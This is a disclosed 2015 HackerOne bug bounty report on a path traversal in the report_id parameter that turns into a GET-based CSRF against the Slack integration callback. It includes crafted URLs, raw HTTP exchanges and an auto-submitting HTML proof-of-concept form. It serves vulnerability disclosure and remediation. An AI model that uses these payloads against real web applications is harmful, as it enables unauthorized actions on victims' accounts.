@@ -1,0 +1,172 @@
+ReportLink:https://hackerone.com/reports/99708
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/defmax
+ReportedTo:HackerOne(security)
+BountyAmount:500.0
+Severity:
+State:Closed
+DateOfDisclosure:02.12.2015 5:25:37
+
+Summary:
+
+Hello team 
+
+I have found an very limited CSRF which could be valid for GET requests only. And the `Integrations` Tab is can be used in bypass 
+
+##Description :
+
+Effected url :- https://hackerone.com/bugs?subject=anontest5667&report_id=0&view=new&substates%5B%5D=new&text_query=&sort_type=latest_activity&sort_direction=descending&limit=25&page=1
+ 
+Effected parameter :- `Report_id` 
+
+When you submit an report id it loads the json of the report. 
+
+######Request :- 
+https://hackerone.com/bugs?subject=anontest5667&report_id=99698&view=new&substates%5B%5D=new&text_query=&sort_type=latest_activity&sort_direction=descending&limit=25&page=1
+
+######Response :- 
+XHR finished loading: GET "https://hackerone.com/reports/99698.json".
+
+When we add an ? at the end we get 
+
+######Request :- 
+https://hackerone.com/bugs?subject=anontest5667&report_id=99698%3F&view=new&substates%5B%5D=new&text_query=&sort_type=latest_activity&sort_direction=descending&limit=25&page=1
+
+######Response :- 
+XHR finished loading: GET "https://hackerone.com/reports/99698?.json".
+
+So i have added `../../../` to get out from reports dirs,
+
+######Request :- 
+https://hackerone.com/bugs?subject=anontest5667&report_id=..%2F..%2F..%2F99698%3F&view=new&substates%5B%5D=new&text_query=&sort_type=latest_activity&sort_direction=descending&limit=25&page=1
+
+######Response :- 
+```
+GET /99698?.json HTTP/1.1
+Host: hackerone.com
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-CSRF-Token: hnDDTUm26xeV9lKMm8pnjsNsXKpMEtitUNMa2PeEFlUNiHLoO2J0lOxJpIYxmnXnbF1hNQMwUdB3e9MErdDktQ==
+X-Requested-With: XMLHttpRequest
+Referer: https://hackerone.com
+
+```
+
+As you can see here we are out of reports folder and you can see CSRF token in header. So Now you can perform CSRF on get requests. so In a team there is a option for integration like slack. where we use oauth to Integrate. this is the only place where GET requests are performed. if we are able to bypass the state parameter validation we will be able to takeover the Team and in my theory I was only able to test slack and I was not able to bypass the validation, I have requested for other integrations ticket #8741. so here is the theory 
+
+#####oauth request :- 
+https://slack.com/oauth/authorize?client_id=2174110321.11522100978&redirect_uri=https%3A%2F%2Fhackerone.com%2Fauth%2Fslack%2Fcallback&response_type=code&scope=incoming-webhook&state=c802bcef4532f0122d0f06088a2eaea890d746f0cb4d39b2
+
+#####Response:
+https://hackerone.com/auth/slack/callback?code={CODE}&state=c802bcef4532f0122d0f06088a2eaea890d746f0cb4d39b2
+
+
+So now lets try to use this in our CSRF url :- 
+
+######Request:
+https://hackerone.com/bugs?subject=anontest5667&report_id=..%2F..%2F..%2F/auth/slack/callback?code=14582397537.14583911921.010c282773&state=c802bcef4532f0122d0f06088a2eaea890d746f0cb4d39b2%3F&view=new&substates%5B%5D=new&text_query=&sort_type=latest_activity&sort_direction=descending&limit=25&page=1
+
+######Request of CSRF :-
+```
+GET //auth/slack/callback?code.json HTTP/1.1
+Host: hackerone.com
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-CSRF-Token: BNkBdXZy5Yi14v1pV0PMwOXB8xfg+HuiBFE36dPJNraPIbDQBKZ6C8xdC2P9E96pSvDOiK/a8t8j+f41iZ3EVg==
+X-Requested-With: XMLHttpRequest
+Referer: https://hackerone.com
+```
+
+######Reponse :- 
+
+```
+HTTP/1.1 302 Found
+Server: cloudflare-nginx
+Date: Sat, 14 Nov 2015 19:20:09 GMT
+Content-Type: text/plain; charset=utf-8
+Content-Length: 9
+Connection: keep-alive
+Cache-Control: no-cache
+Cf-Railgun: c8927a839b stream 0.000000 0231 5f99
+Content-Security-Policy: default-src 'none'; connect-src 'self'; font-src 'self'; frame-src https://www.youtube-nocookie.com https://www.hellosign.com; img-src 'self' data: https://www.google-analytics.com https://cover-photos.hackerone-user-content.com https://profile-photos.hackerone-user-content.com; media-src 'self'; object-src 'none'; script-src 'self' https://www.google-analytics.com; style-src 'self' 'unsafe-inline'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'; report-uri https://app.getsentry.com/api/55143/csp-report/?sentry_version=5&sentry_key=b7f63dee2a404d5e83fff96c50bd700f
+Location: /auth/failure?message=csrf_detected&origin=https%3A%2F%2Fhackerone.com&strategy=slack
+```
+
+You can see the CSRF has failed. So the problem was with .json at the end of the request. so it blocking our parameters to pass. so i have just url encoded everything and added a fake parameter to handle that json 
+
+payload = `code=14582397537.14583819952.b7ff4c7e48&state=9c6fb6b5039b89c496e01cdb6212a12d6430cfa7ee51ba55&asd=`
+
+Url encoded :- `code%3D14582397537.14583819952.b7ff4c7e48%26state%3D9c6fb6b5039b89c496e01cdb6212a12d6430cfa7ee51ba55%26asd%3D`
+
+
+######Request:- 
+https://hackerone.com/bugs?subject=user&report_id=../../../auth/slack/callback?code%3D14582397537.14583819952.b7ff4c7e48%26state%3D9c6fb6b5039b89c496e01cdb6212a12d6430cfa7ee51ba55%26asd%3D&view=open&substates[]=new&substates[]=needs-more-info&substates[]=triaged&text_query=&sort_type=latest_activity&sort_direction=descending&limit=25&page=1
+
+
+######Request of CSRF:- 
+```
+GET /auth/slack/callback?code=14582397537.14583911921.010c282773&state=c802bcef4532f0122d0f06088a2eaea890d746f0cb4d39b2&asd=.json HTTP/1.1
+Host: hackerone.com
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-CSRF-Token: w3CpXrUUjtFVEWBdGu67hWO1drWIOLJn7dwzQj/cdoxIiBj7x8ARUiyullewvqnszIRLKscaOxrKdPqeZYiEbA==
+X-Requested-With: XMLHttpRequest
+Referer: https://hackerone.com
+
+```
+
+######Response :- 
+
+```
+HTTP/1.1 302 Found
+Server: cloudflare-nginx
+Date: Sat, 14 Nov 2015 19:30:14 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 113
+Connection: keep-alive
+Cache-Control: private, no-cache, no-store, must-revalidate
+Cf-Railgun: 5d12521a91 stream 0.000000 0231 5f99
+Content-Disposition: inline; filename="response.html"
+Content-Security-Policy: default-src 'none'; connect-src 'self'; font-src 'self'; frame-src https://www.youtube-nocookie.com https://www.hellosign.com; img-src 'self' data: https://www.google-analytics.com https://cover-photos.hackerone-user-content.com https://profile-photos.hackerone-user-content.com; media-src 'self'; object-src 'none'; script-src 'self' https://www.google-analytics.com; style-src 'self' 'unsafe-inline'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'; report-uri https://app.getsentry.com/api/55143/csp-report/?sentry_version=5&sentry_key=b7f63dee2a404d5e83fff96c50bd700f
+Location: https://hackerone.com/anontest5667/integrations
+
+<html><body>You are being <a href="https://hackerone.com/anontest5667/integrations">redirected</a>.</body></html>
+```
+
+This 302 redirect is for the successfull integration. as i already said i wasnt able to bypass slack state parameter validation but  maybe other maybe vulnerable, I leave it on you to fix it or wont fix
+
+
+#####Html code:- 
+
+```
+<html>
+	<head>
+		<title> CSRF Attack</title>
+	</head>
+	
+	<body onload="document.createElement('form').submit.call(document.getElementById('myForm'))">
+	<center><h1>Integration add CSRF</h1></center>
+<form id="myForm" name="myForm" method="GET" action="https://hackerone.com/bugs">
+<input type="hidden" name="report_id" value="../../../auth/slack/callback?code%3D14582397537.14583819952.b7ff4c7e48%26state%3D9c6fb6b5039b89c496e01cdb6212a12d6430cfa7ee51ba55%26asd%3D"/>
+<center><input type="submit" name="submit"/></center>
+</form>
+
+	
+	</body>
+<html>
+
+```
+
+#####Remediation :
+input validation should be done as if only integer is accepted like you do here https://hackerone.com/reports/asd
+
+Let me know if you need anything 
+
+Regards
+*__N B__*
